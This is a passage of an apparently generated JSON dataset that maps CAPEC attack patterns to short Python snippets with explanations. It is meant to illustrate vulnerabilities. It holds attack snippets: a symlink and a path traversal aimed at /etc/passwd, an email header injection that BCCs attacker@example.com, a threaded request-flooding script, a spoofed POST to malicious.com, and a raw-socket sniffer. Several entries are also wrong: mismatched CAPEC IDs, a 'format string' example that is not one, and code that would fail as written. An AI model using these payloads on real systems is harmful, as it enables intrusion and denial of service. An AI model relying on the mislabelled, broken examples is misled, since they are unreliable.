        "description": "This Python code snippet demonstrates a resource leak scenario, where a resource is acquired but not properly released, leading to potential depletion of the resource. The `Resource` class manages a resource with a threading lock to ensure thread safety. The `acquire_resource` method acquires the lock and sets the resource, while the `release_resource` method releases the resource and the lock. The `use_resource` method attempts to use the resource if it is available. The main part of the code simulates acquiring and using the resource, but intentionally comments out the release step to create a resource leak. This can lead to resource depletion, as the resource is not made available for reuse, embodying the main idea of the CAPEC and related CWEs."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as tmp_file:\n    tmp_file_name = tmp_file.name\n\n# Create a symbolic link to a sensitive file\nsensitive_file = '/etc/passwd'\nos.symlink(sensitive_file, tmp_file_name)\n\n# Open the temporary file (which is actually a symlink to /etc/passwd)\nwith open(tmp_file_name, 'r') as file:\n    content = file.read()\n    print(content)\n\n# Clean up\nos.remove(tmp_file_name)",
        "description": "This Python code snippet demonstrates a symlink attack. It creates a temporary file and then replaces it with a symbolic link to a sensitive file (/etc/passwd). When the code attempts to open the temporary file, it actually accesses the sensitive file due to the symlink. This embodies the main idea of the CAPEC by showing how an attacker can manipulate symbolic links to access unintended resources. The code also highlights CWE-59 (Improper Link Resolution Before File Access), CWE-61 (UNIX Symbolic Link Following), and CWE-73 (External Control of File Name or Path)."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import argparse\n\n# Hidden functionality that is not documented\nDEBUG_MODE = False\n\n# Function to simulate processing with debug information\ndef process_data(data):\n    if DEBUG_MODE:\n        print(f\"Debug: Processing data: {data}\")\n    # Simulate data processing\n    return data[::-1]\n\n# Main function to handle command-line arguments\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Process some data.')\n    parser.add_argument('data', type=str, help='Data to be processed')\n    parser.add_argument('--debug', action='store_true', help='Enable debug mode')\n    args = parser.parse_args()\n\n    # Unchecked error condition\n    try:\n        if args.debug:\n            DEBUG_MODE = True\n        result = process_data(args.data)\n        print(f\"Processed data: {result}\")\n    except Exception as e:\n        pass  # Ignoring exceptions\n",
        "description": "This Python code snippet demonstrates the 'Try All Common Switches' attack pattern by including a hidden debug mode that can be enabled via a command-line switch (`--debug`). The `DEBUG_MODE` variable is not documented and is intended to be hidden from the user. When enabled, it prints debug information that could reveal sensitive details about the application's processing. The code also includes an unchecked error condition where exceptions are ignored, which could lead to unexpected behavior. This snippet embodies the main idea of the CAPEC by showing how an attacker might discover and exploit hidden functionality and weaknesses in error handling."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'sender@example.com'\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # SMTP server configuration\n    smtp_server = 'smtp.example.com'\n    smtp_port = 587\n\n    # Establish connection to the SMTP server\n    server = smtplib.SMTP(smtp_server, smtp_port)\n    server.starttls()\n    server.login('username', 'password')\n\n    # Send the email\n    server.sendmail(from_address, [to_address], msg.as_string())\n    server.quit()\n\n# Example usage\nsend_email('victim@example.com', 'Hello\\nBCC: attacker@example.com', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that is susceptible to email injection attacks. The function `send_email` takes `to_address`, `subject`, and `body` as parameters and sends an email using the SMTP protocol. The vulnerability arises because the input parameters are not properly sanitized or neutralized, allowing an attacker to inject additional headers or manipulate the email content. For example, the subject line in the example usage contains a newline character followed by a BCC header, which could be used to send a copy of the email to an unintended recipient. This code embodies the main idea of CAPEC-139 (Email Injection) and is related to several CWEs, including CWE-150, CWE-116, CWE-147, CWE-113, and CWE-77, which all deal with improper neutralization or encoding of input data."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    print(user_input)\n\nif __name__ == \"__main__\":\n    # CWE-20: Improper Input Validation\n    # CWE-1286: Improper Validation of Syntactic Correctness of Input\n    user_input = input(\"Enter a string: \")\n    vulnerable_function(user_input)\n",
        "description": "This Python code snippet demonstrates a format string injection vulnerability. The `vulnerable_function` takes `user_input` and directly passes it to the `print` function without any validation or sanitization. This is an example of CWE-134 (Use of Externally-Controlled Format String), where the format string originates from an external source (user input). The `input` function in the `__main__` block does not validate the input, representing CWE-20 (Improper Input Validation) and CWE-1286 (Improper Validation of Syntactic Correctness of Input). An attacker could exploit this by providing a string with format specifiers, potentially leading to unexpected behavior or security issues."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\n# Establish a connection to the LDAP server\nconn = ldap.initialize('ldap://localhost')\n\n# User input (potentially malicious)\nusername = input('Enter your username: ')\n\n# Constructing the LDAP query without proper input validation or neutralization\nldap_query = f\"(uid={username})\"\n\ntry:\n    # Perform the LDAP search\n    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_query)\n    print('Search results:', result)\nexcept ldap.LDAPError as e:\n    print('LDAP error:', e)",
        "description": "This Python code snippet demonstrates a basic LDAP query that is vulnerable to LDAP Injection. The code establishes a connection to an LDAP server and takes user input for a username. It then constructs an LDAP query using this input without proper validation or neutralization of special characters. This can allow an attacker to manipulate the query, potentially gaining unauthorized access to sensitive information. For example, if an attacker inputs '*', the query could return information about all users in the LDAP directory. This snippet embodies the main idea of CAPEC-90 (LDAP Injection) and highlights related weaknesses such as improper input validation (CWE-20) and improper neutralization of special elements (CWE-90)."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable code: directly using user input in a URL\n    url = f'http://example.com/search?query={query}'\n    # Simulate a request to the constructed URL\n    response = simulate_request(url)\n    return response\n\ndef simulate_request(url):\n    # This function simulates making a request to the constructed URL\n    return f'Request made to: {url}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to parameter injection. The application has a single route '/search' that accepts a GET request with a 'query' parameter. The user input for 'query' is directly used to construct a URL without proper encoding or validation. This can lead to parameter injection if an attacker supplies a value like 'myInput&new_param=myValue', which would modify the intended query. The code embodies the main idea of CAPEC-137 (Parameter Injection) and highlights related CWEs such as CWE-116 (Improper Encoding or Escaping of Output) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import importlib\n\n# Simulate external input\nuser_input = 'os'\n\n# Unsafe reflection based on user input\ntry:\n    module = importlib.import_module(user_input)\n    print(f'Module {user_input} loaded successfully.')\n    # Potentially dangerous method invocation\n    result = getattr(module, 'system')('ls')\n    print(result)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a reflection injection vulnerability. The code uses the `importlib` library to dynamically import a module based on user input. The `user_input` variable simulates external input, which in this case is set to 'os'. The code then attempts to load the module specified by the user input and invoke the 'system' method of the 'os' module, which executes a shell command ('ls'). This can lead to command injection (CWE-77) and code injection (CWE-94) vulnerabilities, as an attacker could manipulate the input to load malicious modules or execute arbitrary commands. The snippet embodies the main idea of the CAPEC by showing how an adversary can control the input to reflection methods, leading to potentially dangerous outcomes."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/html'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a relative path traversal vulnerability. The function `read_file` takes a `file_path` as input and constructs a full path by joining a base directory (`/var/www/html`) with the user-provided `file_path`. The code does not properly validate or sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. For example, if the user input is `../../etc/passwd`, the function will attempt to read the system's password file, which is a common target in path traversal attacks. This snippet embodies the main idea of the CAPEC by showing how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "from flask import Flask, request, redirect, url_for, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if request.method == 'POST':\n        session['form1_data'] = request.form['data']\n        return redirect(url_for('form2'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if 'form1_data' not in session:\n        return redirect(url_for('form1'))\n    if request.method == 'POST':\n        session['form2_data'] = request.form['data']\n        return redirect(url_for('form3'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if 'form2_data' not in session:\n        return redirect(url_for('form2'))\n    if request.method == 'POST':\n        session['form3_data'] = request.form['data']\n        return 'All forms completed!'\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a multi-step form submission process. The application consists of three forms (form1, form2, and form3) that must be completed in sequence. Each form saves its data in the session and redirects the user to the next form. The code checks for the presence of data from the previous form in the session before allowing access to the next form. This is intended to prevent users from skipping forms. However, the code is vulnerable to several issues: 1) Incomplete Internal State Distinction (CWE-372) as it relies on session data to determine the state, which can be manipulated. 2) External Control of Assumed-Immutable Web Parameter (CWE-472) since session data can be tampered with. 3) Authorization Bypass Through User-Controlled Key (CWE-639) as session keys can be modified. 4) Reliance on Untrusted Inputs in a Security Decision (CWE-807) since the session data is not validated. 5) Cross-Site Request Forgery (CSRF) (CWE-352) as there is no CSRF protection in place."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\nfrom flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n# Cache to store responses\ncache = {}\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    url = request.args.get('url')\n    if url in cache:\n        return cache[url]\n    else:\n        response = requests.get(url)\n        cache[url] = response.text\n        return response.text\n\n@app.route('/clear_cache', methods=['POST'])\ndef clear_cache():\n    cache.clear()\n    return 'Cache cleared'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that fetches data from a given URL and caches the response. The cache is a dictionary that stores responses keyed by the URL. If the requested URL is already in the cache, the cached response is returned. Otherwise, the application fetches the data from the URL, stores it in the cache, and then returns the response. There is also an endpoint to clear the cache.\n\nThis code embodies the main idea of the CAPEC 'Cache Poisoning' by showing how an attacker could exploit the cache mechanism. If an attacker can manipulate the URL parameter, they could potentially poison the cache with harmful data. The related CWEs are represented as follows:\n- CWE-348: The code does not verify the trustworthiness of the URL source.\n- CWE-345: The code does not verify the authenticity of the data fetched from the URL.\n- CWE-349: The code accepts and caches data from untrusted sources.\n- CWE-346: The code does not validate the origin of the data.\n- CWE-524: The cache could potentially store sensitive information without proper access control."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import socket\n\n# Vulnerable DNS resolution function\ndef resolve_hostname(hostname):\n    try:\n        # Perform DNS resolution\n        ip_address = socket.gethostbyname(hostname)\n        return ip_address\n    except socket.gaierror:\n        return None\n\n# Simulate a DNS cache poisoning scenario\ndef main():\n    # Trusted hostname\n    trusted_hostname = 'www.example.com'\n    # Malicious hostname injected into the DNS cache\n    malicious_hostname = 'malicious.example.com'\n\n    # Resolve the trusted hostname (potentially poisoned)\n    resolved_ip = resolve_hostname(trusted_hostname)\n    if resolved_ip:\n        print(f'Resolved IP for {trusted_hostname}: {resolved_ip}')\n    else:\n        print(f'Failed to resolve {trusted_hostname}')\n\n    # Resolve the malicious hostname\n    malicious_ip = resolve_hostname(malicious_hostname)\n    if malicious_ip:\n        print(f'Resolved IP for {malicious_hostname}: {malicious_ip}')\n    else:\n        print(f'Failed to resolve {malicious_hostname}')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified scenario of DNS cache poisoning. The `resolve_hostname` function performs DNS resolution using the `socket.gethostbyname` method. In the `main` function, we simulate a situation where a trusted hostname ('www.example.com') and a malicious hostname ('malicious.example.com') are resolved. If the DNS cache is poisoned, the trusted hostname might resolve to an incorrect IP address specified by an adversary. This code embodies the main idea of DNS cache poisoning (CAPEC-139) and highlights related weaknesses such as insufficient verification of data authenticity (CWE-345) and acceptance of extraneous untrusted data with trusted data (CWE-349)."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\nfrom flask import Flask, send_from_directory, request, abort\n\napp = Flask(__name__)\n\n# CWE-219: Sensitive data stored under web root\n@app.route('/files/<path:filename>')\ndef download_file(filename):\n    # CWE-425: Direct Request ('Forced Browsing')\n    if not request.args.get('auth_token'):\n        abort(403)  # No authorization check\n    try:\n        # CWE-527: Exposure of Version-Control Repository\n        if filename.startswith('.git'):\n            abort(403)  # Block access to version control files\n        # CWE-612: Improper Authorization of Index Containing Sensitive Information\n        if filename == 'index.html':\n            abort(403)  # Block access to sensitive index file\n        return send_from_directory(os.path.join(app.root_path, 'files'), filename)\n    except Exception as e:\n        abort(404)  # File not found\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that serves files from a directory under the web root. The code demonstrates several vulnerabilities: \n1. CWE-219: Sensitive data is stored under the web root directory, making it potentially accessible to unauthorized users.\n2. CWE-425: The application does not enforce proper authorization checks, allowing direct requests to restricted files.\n3. CWE-527: The code attempts to block access to version control files (e.g., .git), but this is done in an ad-hoc manner.\n4. CWE-612: The code blocks access to an index file, but the authorization logic is insufficient and not comprehensive.\n\nThe main idea of the CAPEC is represented by the potential for an adversary to detect and access unpublicized web pages or files due to improper authorization and exposure of sensitive data."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import requests\n\n# URL of the unpublicized web service\nurl = 'http://example.com/hidden_service'\n\n# Attempt to access the unpublicized web service\nresponse = requests.get(url)\n\nif response.status_code == 200:\n    print('Accessed unpublicized web service successfully!')\n    print('Response:', response.text)\nelse:\n    print('Failed to access the unpublicized web service.')",
        "description": "This Python code snippet demonstrates an attempt to access an unpublicized web service, which is the main idea of the CAPEC 'Detect Unpublicized Web Services'. The code uses the 'requests' library to send a GET request to a URL that represents an unpublicized web service. If the service is accessible (status code 200), it prints the response, indicating that the service is reachable despite not being publicized. This scenario can be dangerous as such services may lack adequate security controls. The code embodies CWE-425 (Direct Request) by directly accessing a potentially restricted URL, and CWE-651 (Exposure of WSDL File) by potentially exposing sensitive information if the service is improperly secured."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\n# Function to calculate checksum using a weak hash algorithm (MD5)\ndef calculate_checksum(message):\n    return hashlib.md5(message.encode()).hexdigest()\n\n# Simulate sending a message with its checksum\ndef send_message(message):\n    checksum = calculate_checksum(message)\n    return message, checksum\n\n# Simulate receiving a message and verifying its checksum\ndef receive_message(message, checksum):\n    calculated_checksum = calculate_checksum(message)\n    if calculated_checksum == checksum:\n        print('Message integrity verified.')\n    else:\n        print('Message integrity compromised!')\n\n# Original message\noriginal_message = 'This is a secure message.'\nmessage, checksum = send_message(original_message)\n\n# Adversary modifies the message and spoofs the checksum\nmodified_message = 'This is a tampered message.'\nspoofed_checksum = calculate_checksum(modified_message)\n\n# Receiver checks the tampered message with the spoofed checksum\nreceive_message(modified_message, spoofed_checksum)",
        "description": "This Python code snippet demonstrates a scenario of checksum spoofing using a weak hash algorithm (MD5). The `calculate_checksum` function generates a checksum for a given message. The `send_message` function simulates sending a message along with its checksum. The `receive_message` function verifies the integrity of the received message by comparing the received checksum with the calculated checksum. The code then simulates an adversary modifying the message and spoofing the checksum to match the modified message. When the receiver checks the tampered message with the spoofed checksum, it incorrectly verifies the message integrity, illustrating the vulnerability described in the CAPEC. The use of a weak hash algorithm (MD5) and improper validation of the checksum are key points highlighted by the related CWEs."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to parse XML without validation\n\ndef parse_xml(xml_data, schema_data):\n    try:\n        # Parse the XML schema (assumed to be trusted but can be poisoned)\n        schema_root = ET.fromstring(schema_data)\n        # Parse the XML data\n        xml_root = ET.fromstring(xml_data)\n        # Process the XML data based on the schema\n        # (In a real scenario, this would involve more complex operations)\n        print('XML data processed successfully')\n    except ET.ParseError as e:\n        print(f'Failed to parse XML: {e}')\n\n# Example XML data and schema (both can be controlled by an attacker)\nxml_data = '''<data><item>Example</item></data>'''\nschema_data = '''<schema><element name=\"data\" type=\"string\"/></schema>'''\n\n# Call the vulnerable function\nparse_xml(xml_data, schema_data)",
        "description": "This Python code snippet demonstrates a vulnerable function `parse_xml` that processes XML data based on an XML schema. The function does not validate the XML data against a trusted schema, making it susceptible to XML Schema Poisoning (CAPEC-170). The schema and XML data are both assumed to be trusted but can be controlled by an attacker, leading to potential security issues. This example highlights CWE-112 (Missing XML Validation) and CWE-15 (External Control of System or Configuration Setting) by showing how an attacker can manipulate the schema to compromise the system."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import requests\nimport threading\n\n# Function to send XML payload\ndef send_xml_payload(url, xml_payload):\n    headers = {'Content-Type': 'application/xml'}\n    try:\n        response = requests.post(url, data=xml_payload, headers=headers)\n        print(f'Response Code: {response.status_code}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# XML payload\nxml_payload = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.org/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:ping/>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Target URL\nurl = 'http://target.example.com/webservice'\n\n# Number of threads to simulate rapid requests\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor i in range(num_threads):\n    thread = threading.Thread(target=send_xml_payload, args=(url, xml_payload))\n    threads.append(thread)\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a resource depletion attack, specifically an 'XML Ping of the Death' attack. The code sends a large number of small XML messages to a target URL using multiple threads to simulate rapid requests. The XML payload is a simple SOAP message, which requires additional processing on the target server. This can lead to uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770), potentially causing a denial of service. The code does not include XML validation (CWE-112) and assumes the target URL is correctly specified (CWE-941)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-345: Insufficient Verification of Data Authenticity\n\n# Simulate a content spoofing attack by intercepting and modifying a message\n\n# Original URL (intended destination)\noriginal_url = 'http://example.com/api/data'\n\n# Spoofed URL (incorrectly specified destination)\nspoofed_url = 'http://malicious.com/api/data'\n\n# Original message\noriginal_message = {'user': 'Alice', 'action': 'transfer', 'amount': 100}\n\n# Intercept and modify the message\nintercepted_message = original_message.copy()\nintercepted_message['amount'] = 1000  # Modify the amount\n\n# Send the modified message to the spoofed URL\nresponse = requests.post(spoofed_url, json=intercepted_message)\n\n# Check if the message was accepted\nif response.status_code == 200:\n    print('Content spoofing successful: Message accepted by malicious server')\nelse:\n    print('Content spoofing failed: Message rejected by malicious server')",
        "description": "This Python code snippet demonstrates a content spoofing attack by intercepting and modifying a message during transmission. The original message is intended to be sent to 'http://example.com/api/data', but it is instead sent to a spoofed URL 'http://malicious.com/api/data'. The message content is altered to change the 'amount' field from 100 to 1000. This example embodies the main idea of CAPEC-139 (Content Spoofing) and highlights related CWEs: CWE-941 (Incorrectly Specified Destination), CWE-924 (Improper Enforcement of Message Integrity), and CWE-345 (Insufficient Verification of Data Authenticity). The code shows how an adversary can modify content and redirect it to a malicious server, potentially leading to financial fraud or other malicious outcomes."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\nimport tempfile\n\n# Create a temporary file with a predictable name\npredictable_temp_file = os.path.join(tempfile.gettempdir(), 'tempfile.txt')\n\n# Open the temporary file with insecure permissions\nwith open(predictable_temp_file, 'w') as temp_file:\n    temp_file.write('Sensitive data')\n\nprint(f'Temporary file created at: {predictable_temp_file}')",
        "description": "This Python code snippet demonstrates the creation of a temporary file with a predictable name in a directory that may have insecure permissions. The code uses the `tempfile.gettempdir()` function to get the system's temporary directory and then creates a file named 'tempfile.txt' in that directory. The file is opened with default permissions, which may be insecure. This example embodies the main idea of the CAPEC by showing how an attacker could predict the name and location of a temporary file, potentially leading to further attacks such as information gathering or symlink attacks. The related CWEs are represented by the use of predictable file names (CWE-377), insecure permissions (CWE-378), and the creation of the file in a directory with potentially insecure permissions (CWE-379)."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# Vulnerable code: storing sensitive information in a well-known location\nconfig_file_path = '/etc/myapp/config.txt'\n\n# Writing sensitive information to the config file\nwith open(config_file_path, 'w') as config_file:\n    config_file.write('db_password=SuperSecretPassword123')\n\n# Reading sensitive information from the config file\nwith open(config_file_path, 'r') as config_file:\n    sensitive_data = config_file.read()\n\nprint('Sensitive data:', sensitive_data)",
        "description": "This Python code snippet demonstrates a vulnerability where sensitive information (e.g., a database password) is stored in a well-known location (/etc/myapp/config.txt). An adversary can exploit this by knowing where to look for such configuration files, which are typically stored in predictable directories like /etc on Unix systems. The code writes a sensitive password to a configuration file and then reads it back, illustrating how sensitive data can be exposed if stored in common resource locations. This example aligns with CAPEC-176 'Collect Data from Common Resource Locations' and CWE-552 'Files or Directories Accessible to External Parties', as it makes sensitive information accessible to unauthorized actors who know where to look."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # 'password' hashed with MD5\n}\n\ndef authenticate(username, password):\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    if username in users and users[username] == hashed_password:\n        return True\n    return False\n\n# Simulated login attempt\nusername = 'user1'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Authentication successful!')\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates a basic and vulnerable authentication mechanism. The `authenticate` function checks if the provided username and password match the stored values in the `users` dictionary. The password is hashed using MD5, which is a weak hashing algorithm. This code is vulnerable to identity spoofing attacks due to several reasons: 1) MD5 is not secure and can be easily cracked, 2) there is no mechanism to prevent brute force attacks, and 3) the authentication process does not include any additional checks to verify the identity of the user beyond matching the username and password. This embodies the main idea of CAPEC-151 (Identity Spoofing) and related CWEs such as CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication)."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import re\n\ndef process_user_input(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError(\"Input must be a string\")\n\n    # CWE-1286: Improper Validation of Syntactic Correctness of Input\n    if not re.match(r'^[a-zA-Z0-9_]+$', user_input):\n        raise ValueError(\"Input contains invalid characters\")\n\n    # CWE-1287: Improper Validation of Specified Type of Input\n    if len(user_input) > 20:\n        raise ValueError(\"Input is too long\")\n\n    # CWE-807: Reliance on Untrusted Inputs in a Security Decision\n    if user_input == 'admin':\n        print(\"Access granted to admin panel\")\n    else:\n        print(\"Access denied\")\n\n# Example of vulnerable input\nuser_input = \"admin; DROP TABLE users;\"\nprocess_user_input(user_input)",
        "description": "This Python code snippet demonstrates a function `process_user_input` that processes user input with several validation checks. The function aims to validate the input to prevent common vulnerabilities described in the CAPEC and related CWEs. It checks if the input is a string (CWE-20), ensures the input matches a specific pattern (CWE-1286), validates the length of the input (CWE-1287), and makes a security decision based on the input value (CWE-807). Despite these checks, the code still contains a vulnerability: it relies on the input value 'admin' to grant access, which can be exploited if the input validation is bypassed. This snippet highlights the importance of thorough and correct input validation to prevent security issues."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Simulated user input for resource location\nuser_input_url = 'http://trusted-site.com/resource'\n\n# Vulnerable code: does not verify the URL properly\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-290: Authentication Bypass by Spoofing\n\n# Adversary can spoof the URL to a malicious one\nspoofed_url = user_input_url.replace('trusted-site.com', 'malicious-site.com')\n\n# Requesting the resource from the spoofed URL\nresponse = requests.get(spoofed_url)\n\n# Output the response content\nprint(response.content)",
        "description": "This Python code snippet demonstrates a vulnerability where an application requests a resource from a user-specified URL without proper verification. The code simulates a scenario where an adversary can spoof the URL, causing the application to request a resource from a malicious location instead of the intended trusted site. This embodies the main idea of CAPEC-111: Resource Location Spoofing. The code also highlights related CWEs, such as CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-451 (User Interface Misrepresentation of Critical Information), and CWE-290 (Authentication Bypass by Spoofing). The lack of proper URL verification and endpoint restriction allows the adversary to deceive the application and potentially execute malicious actions."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: User Password')\n    temp_file_path = temp_file.name\n\n# Simulate insecure permissions by setting the file to be world-readable\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate an adversary reading the temporary file\nwith open(temp_file_path, 'r') as file:\n    content = file.read()\n    print(f'Adversary reads: {content}')\n\n# Clean up the temporary file\nos.remove(temp_file_path)",
        "description": "This Python code snippet demonstrates the creation of a temporary file that contains sensitive information, such as a user password. The file is created with insecure permissions (world-readable), which allows unintended actors to access its contents. The code simulates an adversary reading the temporary file, highlighting the vulnerability described in the CAPEC. The snippet embodies CWE-377 (Insecure Temporary File), CWE-524 (Use of Cache Containing Sensitive Information), and CWE-378 (Creation of Temporary File With Insecure Permissions). The main idea is to show how sensitive information stored in temporary files can be exposed due to insecure handling and permissions."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import socket\n\n# This is a simple example of a client sending sensitive data in cleartext\n# which can be intercepted by a sniffing attack.\n\ndef send_sensitive_data(data, server_ip, server_port):\n    try:\n        # Create a socket object\n        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the server\n        client_socket.connect((server_ip, server_port))\n        \n        # Send data in cleartext (CWE-319)\n        client_socket.sendall(data.encode('utf-8'))\n        \n        # Receive response from the server\n        response = client_socket.recv(1024)\n        print('Received:', response.decode('utf-8'))\n        \n    except Exception as e:\n        print('An error occurred:', e)\n    finally:\n        # Close the socket\n        client_socket.close()\n\n# Example usage\nsend_sensitive_data('Sensitive Information', '192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates a simple client-server communication where sensitive data is transmitted in cleartext. The `send_sensitive_data` function creates a socket, connects to a server, and sends sensitive information without encryption (CWE-319). This makes the data vulnerable to sniffing attacks, where an adversary can intercept and read the transmitted information. The code highlights the risk of transmitting sensitive data without proper encryption, aligning with the CAPEC description of sniffing attacks."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import socket\n\n# Create a raw socket to sniff network traffic\nsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to the public network interface\nsniffer.bind(('0.0.0.0', 0))\n\n# Include IP headers in the capture\nsniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nprint('Sniffing network traffic...')\n\ntry:\n    while True:\n        # Receive a packet\n        packet, addr = sniffer.recvfrom(65565)\n        # Print the raw packet data\n        print(packet)\nexcept KeyboardInterrupt:\n    print('Stopping the sniffer')\n    sniffer.close()",
        "description": "This Python code snippet demonstrates a basic network sniffer using raw sockets. The sniffer captures all TCP/IP packets on the network interface and prints the raw packet data. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by passively monitoring and capturing network traffic. The code does not encrypt the captured data (CWE-311), transmits sensitive information in cleartext (CWE-319), and could potentially expose sensitive system information (CWE-497). The code also highlights the risk of capture-replay attacks (CWE-294) if sensitive data is not properly protected."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
